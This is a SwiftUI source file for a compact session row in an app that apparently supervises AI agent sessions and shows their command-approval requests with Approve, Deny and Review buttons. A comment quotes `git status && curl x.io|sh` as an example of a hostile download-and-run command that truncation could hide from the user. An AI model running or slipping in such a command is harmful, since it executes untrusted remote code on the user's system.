import SwiftUI

/// Compact: everything on one ~28pt line.
struct CompactSessionRow: View {
    @Environment(SessionStore.self) private var store
    @Environment(\.swarmScale) private var scale
    let session: AgentSession

    /// See SessionRow.canReply.
    private var canReply: Bool { store.canReply(session) }

    /// Set for a remote prompt nothing here can answer.
    private var terminalOnlyNote: String? {
        guard let host = session.host,
              store.remoteAnswerability(for: session) == .terminalOnly
        else { return nil }
        return RemoteRowLabel.terminalOnlyNote(host: host)
    }

    /// Set when an approval whose request does not fit the compact line
    /// has been opened for review, showing the full preview under it.
    @State private var reviewing = false

    private var approvalPrompt: ApprovalPrompt? {
        if case .waitingApproval(let prompt) = session.status { return prompt }
        return nil
    }

    /// Approve sits inline only when the compact row shows the whole
    /// request. Anything longer is reviewed first, in the full preview.
    ///
    /// A character count cannot promise the request fits the line: at
    /// medium scale the slot holds about a dozen characters, and SwiftUI
    /// cut the rest off with Approve beside it, so `git status && curl
    /// x.io|sh` read as `$ git status…`. An inline request therefore
    /// wraps instead of truncating (see `line`), and the count only keeps
    /// the row from growing past a line or two.
    private var approvesInline: Bool {
        guard let prompt = approvalPrompt else { return false }
        return prompt.offersApprove && ApprovalPreviewText.fitsOneLine(prompt.text)
    }

    var body: some View {
        VStack(alignment: .leading, spacing: 6) {
            line
            if reviewing, let prompt = approvalPrompt, terminalOnlyNote == nil {
                CommandPreview(prompt: prompt)
                ApprovalActions(session: session)
            }
        }
        .padding(.vertical, 5)
        .padding(.horizontal, 8)
        .contentShape(.rect(cornerRadius: 9))
        .hoverHighlight()
        .help(session.title ?? session.projectName)
        .sessionRowInteractions(session, store: store)
    }

    private var line: some View {
        HStack(spacing: 8) {
            StatusDot(status: session.status)
                .id(session.status.label)
            ToolChip(tool: session.tool, size: 18 * scale)
                .doubleClickOpensTerminal(session, store: store)
            Text(session.projectName)
                .swarmFont(.rowTitleCompact)
                .lineLimit(1)
                .frame(maxWidth: 118 * scale, alignment: .leading)
                .doubleClickOpensTerminal(session, store: store)
            if let badge = RemoteRowLabel.badge(for: session) {
                Text(badge)
                    .swarmFont(.meta)
                    .foregroundStyle(.tertiary)
                    .padding(.horizontal, 4)
                    .padding(.vertical, 1)
                    .background(.quaternary, in: RoundedRectangle(cornerRadius: 3))
                    // Attached to the badge itself, a leaf, rather than the
                    // row's outer HStack. That HStack also contains the
                    // Approve/Deny/Reply/Dismiss MicroButtons; an
                    // accessibilityLabel on a transparent container
                    // collapses it into one opaque element with no
                    // interactive trait, which would make those buttons
                    // unreachable to VoiceOver on every compact row, local
                    // and remote alike. A local row has no badge, so it
                    // gets none of this and keeps SwiftUI's default
                    // per-child exposure untouched.
                    .accessibilityLabel(
                        RemoteRowLabel.unreachableNote(
                            host: session.host, reachability: store.remoteReachability
                        ) ?? badge
                    )
            }

            Group {
                switch session.status {
                case .waitingApproval(let prompt):
                    if prompt.isExact, approvesInline {
                        // Approve sits beside this, so it is drawn whole: it
                        // wraps and the row grows, and it is never cut.
                        Text("$ \(ApprovalPreviewText.collapsed(prompt.text, maxLines: 1, columns: 40).text)")
                            .swarmFont(.monoCompact)
                            .foregroundStyle(.orange)
                            .lineLimit(nil)
                            .fixedSize(horizontal: false, vertical: true)
                    } else if prompt.isExact {
                        let first = ApprovalPreviewText.collapsed(prompt.text, maxLines: 1, columns: 40)
                        Text("$ \(first.text)\(first.isCut ? "…" : "")")
                            .swarmFont(.monoCompact)
                            .foregroundStyle(.orange)
                            .help("Open the full request to review it")
                    } else {
                        Text("Request not readable here")
                            .foregroundStyle(.orange)
                    }
                case .waitingInput(let prompt):
                    Text(prompt.isEmpty ? "Waiting on you" : "\u{201C}\(prompt)\u{201D}")
                        .foregroundStyle(.blue)
                case .working(let activity), .runningTool(let activity):
                    Text(activity)
                        .foregroundStyle(.tertiary)
                case .done(let summary):
                    Text(summary)
                        .foregroundStyle(.tertiary)
                case .idle:
                    Text("")
                }
            }
            .swarmFont(.detail)
            .lineLimit(1)
            .frame(maxWidth: .infinity, alignment: .leading)
            .doubleClickOpensTerminal(session, store: store)

            // Reply pastes into the session's terminal, its tmux pane for a
            // remote row, and a remote row with no pane does not offer it.
            // Dismiss only writes SwarmBar's own store. A remote prompt is
            // answered by its held request or its tmux pane, and when
            // neither can reach it the row says where to go instead.
            if case .waitingApproval = session.status {
                if let note = terminalOnlyNote {
                    Text(note)
                        .swarmFont(.meta)
                        .foregroundStyle(.secondary)
                        .lineLimit(1)
                } else if approvesInline {
                    MicroButton(.approve, help: "Approve") { store.approve(session) }
                    MicroButton(.deny, help: "Deny") { store.deny(session) }
                } else if approvalPrompt?.offersApprove ?? false {
                    MicroButton(.review, help: reviewing ? "Hide request" : "Review request") {
                        reviewing.toggle()
                    }
                } else if session.host == nil, session.projectPath != nil {
                    MicroButton(.terminal, help: "Open terminal") { store.openInTerminal(session) }
                }
            }
            if case .waitingInput = session.status {
                if canReply {
                    MicroButton(.reply, help: "Reply") { store.replyingTo = session.id }
                }
                MicroButton(.dismiss, help: "Dismiss") { store.acknowledge(session) }
            }
            // A finished turn whose process is still up can be steered.
            if case .done = session.status, session.processAlive, canReply {
                MicroButton(.reply, help: "Reply") { store.replyingTo = session.id }
            }

            ElapsedTimeText(since: session.elapsedAnchor, ago: session.status.timerReadsAgo)
        }
    }
}

struct MicroButton: View {
    @Environment(\.swarmScale) private var scale

    enum Kind {
        case approve, deny, reply, dismiss, review, terminal

        var symbol: String {
            switch self {
            case .approve:  "checkmark"
            case .deny:     "xmark"
            case .reply:    "arrowshape.turn.up.left"
            case .dismiss:  "checkmark"
            case .review:   "chevron.down"
            case .terminal: "terminal"
            }
        }
    }

    let kind: Kind
    let help: String
    let action: () -> Void

    init(_ kind: Kind, help: String, action: @escaping () -> Void) {
        self.kind = kind
        self.help = help
        self.action = action
    }

    var body: some View {
        Button(action: action) {
            Image(systemName: kind.symbol)
                .swarmFont(.iconSmall)
                .foregroundStyle(foreground)
                .frame(width: 20 * scale, height: 20 * scale)
                .background(background, in: .rect(cornerRadius: 6))
        }
        .buttonStyle(.plain)
        .help(help)
        // The icon carries no text, so without this VoiceOver announces
        // an anonymous button. `help` is a tooltip and is NOT read as a
        // label; the two are separate and both are needed.
        .accessibilityLabel(help)
    }

    private var foreground: AnyShapeStyle {
        switch kind {
        case .approve: AnyShapeStyle(.black.opacity(0.85))
        case .deny:    AnyShapeStyle(.primary)
        case .reply:   AnyShapeStyle(.white)
        case .dismiss, .terminal: AnyShapeStyle(.primary)
        case .review:  AnyShapeStyle(.black.opacity(0.85))
        }
    }

    private var background: AnyShapeStyle {
        switch kind {
        case .approve, .review: AnyShapeStyle(.orange)
        case .deny:    AnyShapeStyle(.primary.opacity(0.12))
        case .reply:   AnyShapeStyle(.blue)
        case .dismiss, .terminal: AnyShapeStyle(.primary.opacity(0.12))
        }
    }
}
